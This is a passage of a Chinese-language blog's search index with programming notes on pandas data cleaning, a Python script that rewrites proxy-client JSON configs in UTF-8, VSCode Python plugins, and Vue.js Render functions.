kgs，2.2lbs=1kgs</span></span><br><span class="line"><span class="keyword">for</span> i,lbs_row <span class="keyword">in</span> df[rows_with_lbs].iterrows():</span><br><span class="line">    weight = <span class="built_in">int</span>(<span class="built_in">float</span>(lbs_row[<span class="string">&#x27;weight&#x27;</span>][:-<span class="number">3</span>]/<span class="number">2.2</span>)</span><br><span class="line">    df.at[i,<span class="string">&#x27;weight&#x27;</span>] = <span class="string">&#x27;&#123;&#125;kgs&#x27;</span>.<span class="built_in">format</span>(weight)</span><br></pre></td></tr></table></figure></li></ul></li><li><p>合法性</p></li><li><p>唯一性：数据存在重复记录，需要删除重复值</p></li></ul></li><li>数据的展示</li></ul>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
          <category> 数据分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python：json.dump输出为utf-8编码的文件</title>
      <link href="/categories/Python/python-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/python%EF%BC%9Ajson-dump%E8%BE%93%E5%87%BA%E4%B8%BAutf-8%E7%BC%96%E7%A0%81%E7%9A%84%E6%96%87%E4%BB%B6/"/>
      <url>/categories/Python/python-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/python%EF%BC%9Ajson-dump%E8%BE%93%E5%87%BA%E4%B8%BAutf-8%E7%BC%96%E7%A0%81%E7%9A%84%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<p>将 <code>dict</code> 转为 <code>str</code>,在解码编码通过 <code>write</code> 形式写入</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(sscapRootPath,<span class="string">&#x27;w&#x27;</span>,encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ssr_list=json.dumps(ssr_list,indent=<span class="number">4</span>,separators=(<span class="string">&#x27;,&#x27;</span>,<span class="string">&#x27;: &#x27;</span>))</span><br><span class="line">    f.<span class="built_in">write</span>(ssr_list.encode(<span class="string">&#x27;utf-8&#x27;</span>).decode(<span class="string">&#x27;unicode_escape&#x27;</span>))</span><br></pre></td></tr></table></figure><p><strong>代码文件：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">test_path=<span class="string">r&#x27;D:\K\Program Files\ssr_for_win\gui-config.json&#x27;</span></span><br><span class="line">sscapRootPath=<span class="string">r&#x27;D:\K\Program Files\SsCAP\SSCap-v4.0\config&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getTest</span>():</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(test_path,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        test_list=json.load(f)</span><br><span class="line">    test_list_t=[]</span><br><span class="line">    test_dict=&#123;&#125;  <span class="comment">#不能直接使用 dict , 因为是地址传递</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(test_list[<span class="string">&quot;configs&quot;</span>]))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(test_list[<span class="string">&quot;configs&quot;</span>])):</span><br><span class="line"></span><br><span class="line">        s_server=test_list[<span class="string">&quot;configs&quot;</span>][i][<span class="string">&quot;server&quot;</span>]</span><br><span class="line">        s_server_port=test_list[<span class="string">&quot;configs&quot;</span>][i][<span class="string">&quot;server_port&quot;</span>]</span><br><span class="line">        s_password=test_list[<span class="string">&quot;configs&quot;</span>][i][<span class="string">&quot;password&quot;</span>]</span><br><span class="line">        s_method=test_list[<span class="string">&quot;configs&quot;</span>][i][<span class="string">&quot;method&quot;</span>]</span><br><span class="line">        s_remarks=test_list[<span class="string">&quot;configs&quot;</span>][i][<span class="string">&quot;remarks&quot;</span>]</span><br><span class="line">        s_group=test_list[<span class="string">&quot;configs&quot;</span>][i][<span class="string">&quot;group&quot;</span>]</span><br><span class="line">        s_enable= <span class="literal">True</span></span><br><span class="line">        test_list_t.append(&#123;<span class="string">&quot;server&quot;</span>:s_server,<span class="string">&quot;server_port&quot;</span>:s_server_port,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>:s_password,<span class="string">&quot;method&quot;</span>:s_method,<span class="string">&quot;remarks&quot;</span>:s_remarks,<span class="string">&quot;group&quot;</span>:s_group&#125;) </span><br><span class="line"></span><br><span class="line">    <span class="comment">#   gui-config-bk.json</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(sscapRootPath+<span class="string">r&#x27;\gui-config-bk.json&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        test_list=json.load(f)</span><br><span class="line">        test_list[<span class="string">&#x27;configs&#x27;</span>]=test_list_t</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(sscapRootPath+<span class="string">r&#x27;\gui-config.json&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        test_list=json.dumps(test_list,indent=<span class="number">4</span>,separators=(<span class="string">&#x27;,&#x27;</span>,<span class="string">&#x27;: &#x27;</span>))</span><br><span class="line">        f.write(test_list.encode(<span class="string">&#x27;utf-8&#x27;</span>).decode(<span class="string">&#x27;unicode_escape&#x27;</span>))</span><br><span class="line">        <span class="comment">#json.dump(test_list,f,indent=4,separators=(&#x27;,&#x27;,&#x27;: &#x27;))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    getTest()</span><br></pre></td></tr></table></figure><span id="more"></span>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
          <category> python 常见问题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vscode那些好用的插件</title>
      <link href="/categories/%E6%9C%89%E9%81%93%E4%BA%91%E7%AC%94%E8%AE%B0-%E6%90%AC/%E9%85%8D%E7%BD%AE/vscode%E9%85%8D%E7%BD%AE/vscode%E9%82%A3%E4%BA%9B%E5%A5%BD%E7%94%A8%E7%9A%84%E6%8F%92%E4%BB%B6/"/>
      <url>/categories/%E6%9C%89%E9%81%93%E4%BA%91%E7%AC%94%E8%AE%B0-%E6%90%AC/%E9%85%8D%E7%BD%AE/vscode%E9%85%8D%E7%BD%AE/vscode%E9%82%A3%E4%BA%9B%E5%A5%BD%E7%94%A8%E7%9A%84%E6%8F%92%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.jianshu.com/p/2e2b8701ae5c">网址-profile</a></p><h4 id="VSCode"><a href="#VSCode" class="headerlink" title="VSCode"></a>VSCode</h4><ul><li><code>VSCode Icons</code> 插件<ul><li>作用：左侧资源管理器根据文件类型显示图标</li></ul></li></ul><h4 id="python"><a href="#python" class="headerlink" title="python"></a>python</h4><ul><li><p><code>flask</code></p><ul><li>作用：提示代码错误</li><li>安装<ul><li>命令行: <code>pip install flake8</code></li><li>用户设置 -&gt;  <code>setting.json</code>:<code>&quot;python.linting.flake8Enabled&quot;:true</code></li></ul></li><li>其他<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">//</span>用户设置中： 修改最大字符</span><br><span class="line"><span class="string">&quot;python.linting.flake8Args&quot;</span>: [<span class="string">&quot;--max-line-length=248&quot;</span>]</span><br></pre></td></tr></table></figure></li></ul></li><li><p><code>pylint-django</code>:<span id="more"></span></p><ul><li>兼容<code>django</code>的<code>pylint</code>,代码检查</li></ul></li><li><p><code>yapf</code></p><ul><li>作用：按<code>alt+shift+F</code> 自动格式化代码</li><li>安装<ul><li><code>pip install yapf</code></li><li><code>settings.json</code>:<code>&quot;python.formatting.provider&quot;:&quot;yapf&quot;</code></li></ul></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 有道云笔记-搬 </category>
          
          <category> 配置 </category>
          
          <category> vscode配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vscode </tag>
            
            <tag> 插件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>9.Render函数</title>
      <link href="/categories/%E5%89%8D%E7%AB%AF/%E3%80%8AVue-js-%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/9-render%E5%87%BD%E6%95%B0/"/>
      <url>/categories/%E5%89%8D%E7%AB%AF/%E3%80%8AVue-js-%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/9-render%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<h4 id="9-1-什么是-Virtrual-Dom"><a href="#9-1-什么是-Virtrual-Dom" class="headerlink" title="9.1 什么是 Virtrual Dom"></a>9.1 什么是 Virtrual Dom</h4><p>Virtual Dom 是基于 JavaScript 计算的，在状态发生变化时，Virtual Dom 会进行 Diff 运算。<br><img src="//tva3.sinaimg.cn/large/005zbIM7ly1g5vtpdwp17j30ii06u786.jpg" alt="img"></p><p>正常的 DOM 节点在 HTML 中：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;main&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>文本内容<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>文本内容<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p>用 Virtual Dom 创建的 JavaScript 对象一般会是这样的：</p><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> vNode = &#123;</span><br><span class="line">    tag: <span class="string">&#x27;div&#x27;</span>,</span><br><span class="line">    attributes:&#123;</span><br><span class="line">        <span class="symbol">id</span>: <span class="string">&#x27;main&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    children:&#123;</span><br><span class="line">        <span class="comment">//p 节点</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><span id="more"></span><p>Virtual Dom 就是通过一种 VNode 类表达的，每个 DOM 元素或组件都对应一<br>个 VNode 对象。(关键字: <code>tag,data,childred,text...</code>)</p><p><strong>VNode 主要分为如下几类：</strong></p><ul><li>TextVNode 文本节点</li><li>ElementVNode 普通元素节点</li><li>ComponentVNode 组件节点</li><li>EmptyVNode 没有内容的注释节点</li><li>CloneVNode 克隆节点，可以是以上任意类型的节点，唯一的区别在于 isCloned 属性为 true 。</li></ul><p>多数场景使用 template 就足够，但在一些特定的场景下，使用 Virtual Dom 会更简单。</p><h4 id="9-2-什么是-Render-函数"><a href="#9-2-什么是-Render-函数" class="headerlink" title="9.2 什么是 Render 函数"></a>9.2 什么是 Render 函数</h4><h5 id="实现锚点标签"><a href="#实现锚点标签" class="headerlink" title="实现锚点标签"></a>实现锚点标签</h5><ul><li><p>使用 template 实现</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">div#app</span><br><span class="line">    anchor[level=&quot;2&quot;][title=&quot;特性&quot;]&#123;特性&#125;</span><br><span class="line">    </span><br><span class="line">script[text/x-template][id=&quot;anchor&quot;]</span><br><span class="line">    div</span><br><span class="line">        (h$[v-if=&quot;level===$&quot;][:id=&quot;title&quot;]&gt;a[:href=&quot;&#x27;#&#x27;+title&quot;]&gt;slot )*6</span><br><span class="line"></span><br><span class="line">script</span><br><span class="line">    Vue.component(&quot;anchor&quot;,&#123;</span><br><span class="line">        props:&#123;</span><br><span class="line">            title:&#123;</span><br><span class="line">                type:String,</span><br><span class="line">                default:&#x27;&#x27;</span><br><span class="line">            &#125;,</span><br><span class="line">            level:&#123;</span><br><span class="line">                type:Number,</span><br><span class="line">                required:true</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    var app = new Vue(&#123;</span><br><span class="line">        el:&#x27;#app&#x27;</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure></li><li><p>使用 Render 实现</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">div#app</span><br><span class="line">    anchor[level=&quot;2&quot;][title=&quot;特性&quot;]&#123;特性&#125;</span><br><span class="line">script</span><br><span class="line">    Vue.component(&#x27;anchor&#x27;,&#123;</span><br><span class="line">        props:&#123;</span><br><span class="line">            level:&#123;</span><br><span class="line">                type:Number,</span><br><span class="line">                required:true</span><br><span class="line">            &#125;,</span><br><span class="line">            title:&#123;</span><br><span class="line">                type:String,</span><br><span class="line">                default:&#x27;&#x27;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        render:funciton(createElement)&#123;</span><br><span class="line">            return createElement(</span><br><span class="line">                &#x27;h&#x27;+this.level,</span><br><span class="line">                &#123;</span><br><span class="line">                    attrs:&#123;</span><br><span class="line">                        id:this.title</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;,</span><br><span class="line">                [</span><br><span class="line">                    createElement(</span><br><span class="line">                        &#x27;a&#x27;,</span><br><span class="line">                        &#123;</span><br><span class="line">                            domProps:&#123;</span><br><span class="line">                                href:&#x27;#&#x27;+this.title</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;,</span><br><span class="line">                        this.$slots.default</span><br><span class="line">                    )</span><br><span class="line">                ]</span><br><span class="line">            )</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure></li></ul><h4 id="9-3-reateElement-用法"><a href="#9-3-reateElement-用法" class="headerlink" title="9.3 reateElement 用法"></a>9.3 reateElement 用法</h4><h5 id="9-3-1-基本参数"><a href="#9-3-1-基本参数" class="headerlink" title="9.3.1 基本参数"></a>9.3.1 基本参数</h5><p>createElement 构成了 Vue Virtual Dom 的模板，它有 3 个参数： </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">createElement(</span><br><span class="line">    <span class="regexp">//</span> &#123;String | Object | Function)</span><br><span class="line">    <span class="regexp">//</span>一个 HTML 标签，组件选项，或一个函数</span><br><span class="line">    <span class="regexp">//</span>必须 Return 上述其中一个</span><br><span class="line">    <span class="string">&#x27;div&#x27;</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="regexp">//</span>&#123;Object&#125;</span><br><span class="line">    <span class="regexp">//</span> 一个对应属性的数据对象，可选</span><br><span class="line">    <span class="regexp">//</span>可以在 template 中使用</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="regexp">//</span>和 v-bind:class 一样的 API</span><br><span class="line">        class:&#123;</span><br><span class="line">            foo : true ,</span><br><span class="line">            bar: false</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="regexp">//</span>和 v-bind:style 一样的 API</span><br><span class="line">        style : &#123;</span><br><span class="line">            color:<span class="string">&#x27;red&#x27;</span>,</span><br><span class="line">            fontSize:<span class="string">&#x27;14px&#x27;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="regexp">//</span>正常的 HTML 特性</span><br><span class="line">        attrs: &#123;</span><br><span class="line">            id:<span class="string">&#x27;foo&#x27;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="regexp">//</span>组件 props</span><br><span class="line">        props: &#123;</span><br><span class="line">            myProp : <span class="string">&#x27;bar&#x27;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="regexp">//</span>DOM 属性</span><br><span class="line">        domProps: &#123;</span><br><span class="line">            InnerHTML ：<span class="string">&#x27;baz&#x27;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="regexp">//</span>自定义事件监听器<span class="string">&quot;on&quot;</span></span><br><span class="line">        <span class="regexp">//</span>不支持如 v-on:keyup.enter 的修饰器</span><br><span class="line">        <span class="regexp">//</span>需要手动匹配 keyCode</span><br><span class="line">        on: &#123;</span><br><span class="line">            click: this.clickHandler</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="regexp">//</span>仅对于组件，用于监听原生事件</span><br><span class="line">        <span class="regexp">//</span>而不是组件使用 vm.<span class="variable">$emit</span> 触发的自定义事件</span><br><span class="line">        nativeOn: &#123;</span><br><span class="line">            click: this.nativeClickHandler</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="regexp">//</span>自定义指令</span><br><span class="line">        directives: [</span><br><span class="line">            name:<span class="string">&#x27;my-custom-directive&#x27;</span>,</span><br><span class="line">            value:<span class="string">&#x27;2&#x27;</span></span><br><span class="line">            expression:<span class="string">&#x27;1 + 1&#x27;</span>,</span><br><span class="line">            arg : <span class="string">&#x27;foo&#x27;</span>,</span><br><span class="line">            modifiers : &#123;</span><br><span class="line">                bar: true</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="regexp">//</span>作用域 slot</span><br><span class="line">        <span class="regexp">//</span>&#123; name: props =&gt; VNode | Array&lt;VNode&gt; &#125;</span><br><span class="line">        scopedSlots: &#123;</span><br><span class="line">            default: props =&gt; h(<span class="string">&#x27;span&#x27;</span>, props text)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="regexp">//</span>如果子组件有定义 slot 的名称</span><br><span class="line">        slot:<span class="string">&#x27;name-of-slot&#x27;</span></span><br><span class="line">        <span class="regexp">//</span>其他特殊顶层属性</span><br><span class="line">        key: <span class="string">&#x27;myKey&#x27;</span>,</span><br><span class="line">        ref: <span class="string">&#x27;myRef&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    </span><br><span class="line">    <span class="regexp">//</span> &#123;String | Array)</span><br><span class="line">    <span class="regexp">//</span> 子节点（ VNodes ），可选</span><br><span class="line">    [</span><br><span class="line">        createElement ( <span class="string">&#x27;h1&#x27;</span>,<span class="string">&#x27;hello world&#x27;</span>),</span><br><span class="line">        createElement(MyComponent, &#123;</span><br><span class="line">            props : &#123;</span><br><span class="line">                someProp:<span class="string">&#x27;foo&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;),</span><br><span class="line">        <span class="string">&#x27;bar&#x27;</span></span><br><span class="line">    ]</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>第一个参数必选，可以是一个 HTML 标签，也可以是一个组件或函数；第二个是可选参数，数据对象，在 template 中使用。第三个是子节点，也是可选参数，用法一致。</p><h5 id="9-3-2-约束"><a href="#9-3-2-约束" class="headerlink" title="9.3.2 约束"></a>9.3.2 约束</h5><p>所有组件树中，如果 VNode 是组件或含有组件的 slot ，那么 VNode 必须唯一。<br><br><strong>错误的写法:</strong><br></p><ol><li>重复使用组件<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">script</span><br><span class="line">    <span class="comment">//局部声明组件</span></span><br><span class="line">    <span class="keyword">var</span> Child=&#123;</span><br><span class="line">        <span class="attr">render</span>:<span class="function"><span class="keyword">function</span>(<span class="params">createElement</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> createElement(<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;text&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    Vue.component(<span class="string">&#x27;ele&#x27;</span>,&#123;</span><br><span class="line">        <span class="attr">render</span>:<span class="function"><span class="keyword">function</span>(<span class="params">createElemnt</span>)</span>&#123;</span><br><span class="line">            <span class="comment">//使用组件 Child, 创建一个子节点</span></span><br><span class="line">            <span class="keyword">var</span> ChildNode=createElement(Child);</span><br><span class="line">            <span class="keyword">return</span> createElement(<span class="string">&#x27;div&#x27;</span>,[</span><br><span class="line">                ChildNode,</span><br><span class="line">                ChildNode</span><br><span class="line">            ])</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="comment">//-----</span></span><br><span class="line"><span class="comment">//改</span></span><br><span class="line"><span class="built_in">Array</span>.apply(<span class="literal">null</span>,&#123;<span class="attr">length</span>:<span class="number">2</span>&#125;).map(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> createElement(Child)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li>重复使用含有组件的 slot<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;-    div#app&gt;ele&gt;div&gt;Child    -&gt;</span><br><span class="line"><span class="comment">//全局注册组件</span></span><br><span class="line">Vue.component(<span class="string">&#x27;Child&#x27;</span>,&#123;</span><br><span class="line">    <span class="attr">render</span>:<span class="function"><span class="keyword">function</span>(<span class="params">createElement&#123;</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="keyword">return</span> createElement(<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;text&#x27;</span>);</span></span></span><br><span class="line"><span class="params"><span class="function">    &#125;</span></span></span><br><span class="line"><span class="params"><span class="function">&#125;</span>)</span>;</span><br><span class="line"></span><br><span class="line">Vue.component(<span class="string">&#x27;ele&#x27;</span>,&#123;</span><br><span class="line">    <span class="attr">render</span>:<span class="function"><span class="keyword">function</span>(<span class="params">createElement</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> createElement(<span class="string">&#x27;div&#x27;</span>,&#123;</span><br><span class="line">            <span class="built_in">this</span>.$slots.default,</span><br><span class="line">            <span class="built_in">this</span>.$slots.default</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>上面两个例子中的两个 <code>Child</code> 组件都只能渲染出一个，<code>VNode</code>受到了约束。</li></ol><p>如何重复使用组件，或含有组件的 slot。 </p><p><em>代码在文件夹 9.3.2 约束 中</em></p><p>通过一个循环和工厂函数可以渲染5个重复的子组件 Child。 <strong>p145</strong><br>深度克隆子节点</p><h5 id="9-3-3-使用-JavaScript-代替模板功能"><a href="#9-3-3-使用-JavaScript-代替模板功能" class="headerlink" title="9.3.3 使用 JavaScript 代替模板功能"></a>9.3.3 使用 JavaScript 代替模板功能</h5><p>在 Render 函数中，不能使用 Vue 内置的指令，所以可以用原生的 JavaScript 实现。</p><ul><li><code>v-if | v-else</code></li><li><code>v-for</code></li><li><code>map</code></li><li><code>v-model</code></li><li><code>修饰符</code></li></ul><table><thead><tr><th>修饰符</th><th>对应的句柄</th></tr></thead><tbody><tr><td><code>.stop</code></td><td><code>event.stopPropagation()</code></td></tr><tr><td><code>.prevent</code></td><td><code>event.preventDefault()</code></td></tr><tr><td><code>.self</code></td><td><code>if(event.target!==event.currentTarget) return</code></td></tr><tr><td><code>.enter、.13</code></td><td><code>if(event.keyCode!==13) return</code> 替换 13 位需要的 <code>keyCode</code></td></tr><tr><td><code>.ctrl、.alt、.shift、.meta</code></td><td><code>if(!event.ctrlKey) return</code> 根据需要替换 <code>ctrlKey</code> 为 <code>altKey</code>、<code>shiftKey</code> 或 <code>metaKey</code>。</td></tr></tbody></table><table><thead><tr><th>修饰符</th><th>特殊的前缀(写在 on 里)</th></tr></thead><tbody><tr><td><code>.capture</code></td><td>!</td></tr><tr><td><code>.once</code></td><td>~</td></tr><tr><td><code>.capture.once</code> 或 <code>.once.capture</code></td><td>~!</td></tr></tbody></table><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//写在 on 前</span></span><br><span class="line"><span class="attr">on</span>: &#123;</span><br><span class="line">    <span class="string">&#x27;!click&#x27;</span>: <span class="built_in">this</span>.doThisInCapturingMode,</span><br><span class="line">    <span class="string">&#x27;~keyup&#x27;</span>: <span class="built_in">this</span>.doThisOnce,</span><br><span class="line">    <span class="string">&#x27;~!mouseover&#x27;</span>:<span class="built_in">this</span>.doThisOnceInCapturingMode</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>slot</code></li></ul><h4 id="9-4-函数化组件"><a href="#9-4-函数化组件" class="headerlink" title="9.4 函数化组件"></a>9.4 函数化组件</h4><p>作用：减少开销渲染<br>做法：Render 